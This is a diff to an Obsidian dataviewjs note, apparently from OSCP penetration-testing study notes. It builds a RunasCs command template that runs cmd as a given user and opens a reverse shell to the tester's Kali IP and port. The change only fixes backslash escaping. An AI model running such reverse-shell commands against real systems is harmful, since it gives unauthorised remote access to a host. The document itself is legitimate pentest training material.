@@ -15,7 +15,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `.\RunasCs.exe [user] [pw] -r ${KaliIP}:[port] cmd`;
+const command = `.\\\RunasCs.exe [user] [pw] -r ${KaliIP}:[port] cmd`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
